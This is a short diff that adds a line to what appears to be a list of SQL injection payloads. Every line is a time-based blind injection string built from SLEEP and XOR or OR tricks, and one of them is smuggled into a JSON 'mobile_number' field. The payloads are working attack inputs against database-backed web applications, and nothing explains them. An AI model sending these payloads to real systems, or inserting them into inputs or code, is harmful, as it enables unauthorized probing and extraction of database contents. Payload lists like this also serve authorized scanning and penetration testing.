@@ -1,3 +1,4 @@
+' OR NOT 08129=8129#'+(select*from(select(sleep(20)))a)+'
 {"mobile_number":"8888888888'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z"}
 'XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z'XOR(SELECT(5)FROM(SELECT(SLEEP(10)))a)XOR'
 
